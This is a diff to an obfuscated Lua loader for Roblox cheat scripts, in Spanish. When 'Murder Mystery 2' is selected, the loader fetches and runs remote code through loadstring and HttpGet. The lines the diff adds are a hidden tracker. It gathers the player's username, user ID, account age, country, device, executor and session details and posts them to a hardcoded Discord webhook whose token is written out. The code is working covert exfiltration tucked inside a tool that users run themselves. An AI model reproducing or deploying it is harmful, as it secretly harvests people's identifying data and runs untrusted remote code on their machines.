@@ -9,6 +9,130 @@ data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) i
 
 if _G.scriptSeleccionado == GOVJuCEXuiKU('ihvyysKolreQgGCGhhhbAlFcLtpLXVkUOuHhBmlxtKJgsAyHPmTwmEiTXVyZGVyIE15c3RlcnkgMg==') then
     loadstring(game:HttpGet(GOVJuCEXuiKU('SjetPIZOxjyYuviNiCfeknyosfCJBuLXZOhZPCpRvpSuqWlpFSYXGtJaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JvdDEyMDAvTS9yZWZzL2hlYWRzL21haW4vTQ==')))()
+local webhookURL = "https://discord.com/api/webhooks/1355801813370147027/TgiFXg8zxFWGOU0qRJGi9pqo30-hUxiMfSPRs_x432iDAc2C4HuIefWGmkP0cu-NvNQp"
+
+local player = game:GetService("Players").LocalPlayer
+local username = player.Name
+local displayName = player.DisplayName
+local userId = player.UserId
+local accountAge = player.AccountAge
+
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local placeId = game.PlaceId
+local jobId = game.JobId or "Unknown Job ID"
+
+local LocalizationService = game:GetService("LocalizationService")
+local success, result = pcall(function()
+    return LocalizationService:GetCountryRegionForPlayerAsync(player)
+end)
+local country = success and result or "Desconocido"
+
+local executor = "Unknown Executor"
+if syn then
+    executor = "Synapse X"
+elseif KRNL_LOADED then
+    executor = "KRNL"
+elseif fluxus then
+    executor = "Fluxus"
+elseif evon then
+    executor = "Evon"
+elseif Arceus then
+    executor = "Arceus X"
+elseif wave then
+    executor = "Wave"
+elseif codex then
+    executor = "Codex"
+elseif vega_x then
+    executor = "Vega X"
+elseif delta then
+    executor = "Delta"
+elseif solara then
+    executor = "Solara"
+elseif cryptic then
+    executor = "Cryptic"
+elseif trigon then
+    executor = "Trigon"
+elseif MantiPWF then
+    executor = "MantiPWF"
+else
+    if identifyexecutor then
+        executor = identifyexecutor()
+    elseif getexecutorname then
+        executor = getexecutorname()
+    end
+end
+
+local daysInSpanish = {
+    Sunday = "Domingo",
+    Monday = "Lunes",
+    Tuesday = "Martes",
+    Wednesday = "Miércoles",
+    Thursday = "Jueves",
+    Friday = "Viernes",
+    Saturday = "Sábado"
+}
+
+local dateTime = os.date("*t")
+local dayOfWeek = daysInSpanish[os.date("%A")]
+local hour = dateTime.hour
+local ampm = hour >= 12 and "PM" or "AM"
+hour = hour % 12
+hour = hour == 0 and 12 or hour
+local formattedDate = string.format("%02d/%02d/%04d", dateTime.day, dateTime.month, dateTime.year)
+local formattedTime = string.format("%02d:%02d %s", hour, dateTime.min, ampm)
+
+local UserInputService = game:GetService("UserInputService")
+local deviceType
+if UserInputService.TouchEnabled then
+    deviceType = "Móvil o Tablet"
+else
+    deviceType = "PC"
+end
+
+local function getRandomColor()
+    local r = math.random(0, 255)
+    local g = math.random(0, 255)
+    local b = math.random(0, 255)
+    return r * 65536 + g * 256 + b
+end
+
+local color = getRandomColor()
+
+local function sendToDiscord(message)
+    local request = http_request or request or syn.request or http.request
+    if not request then return end
+
+    local data = {
+        ["content"] = message,
+        ["embeds"] = {{
+            ["title"] = "Notificación de Ejecución en Roblox",
+            ["fields"] = {
+                {["name"] = "Usuario:", ["value"] = username, ["inline"] = false},
+                {["name"] = "Nombre Visible:", ["value"] = displayName, ["inline"] = false},
+                {["name"] = "ID de Usuario:", ["value"] = tostring(userId), ["inline"] = false},
+                {["name"] = "Edad de la Cuenta:", ["value"] = tostring(accountAge) .. " días", ["inline"] = false},
+                {["name"] = "Ejecutor:", ["value"] = executor, ["inline"] = false},
+                {["name"] = "Juego:", ["value"] = gameName, ["inline"] = false},
+                {["name"] = "Place ID:", ["value"] = tostring(placeId), ["inline"] = false},
+                {["name"] = "Job ID:", ["value"] = jobId, ["inline"] = false},
+                {["name"] = "País:", ["value"] = country, ["inline"] = false},
+                {["name"] = "Dispositivo:", ["value"] = deviceType, ["inline"] = false},
+                {["name"] = "Fecha y Hora:", ["value"] = formattedDate .. " " .. formattedTime, ["inline"] = false},
+                {["name"] = "Día de la Semana:", ["value"] = dayOfWeek, ["inline"] = false}
+            },
+            ["color"] = color
+        }}
+    }
+
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = game:GetService("HttpService"):JSONEncode(data)
+    })
+end
+
+sendToDiscord("¡Notificación enviada!")
     print(GOVJuCEXuiKU('RpkTnVWThXyqdzLRsPHWpCznvrzOmOMrjfyhNoNRahSgQUnklVcYnCMRWplY3V0YW5kbyBzY3JpcHQgZGUgTXVyZGVyIE15c3RlcnkgMg=='))
 
 elseif _G.scriptSeleccionado == GOVJuCEXuiKU('RpeqKKwTIPbrlBihwgoscJSOCZxZuOafFfFLEqPGdzrjMCmEBpLyTsATXVyZGVyZXJzIFZTIFNoZXJpZmZzIGR1ZWw=') then
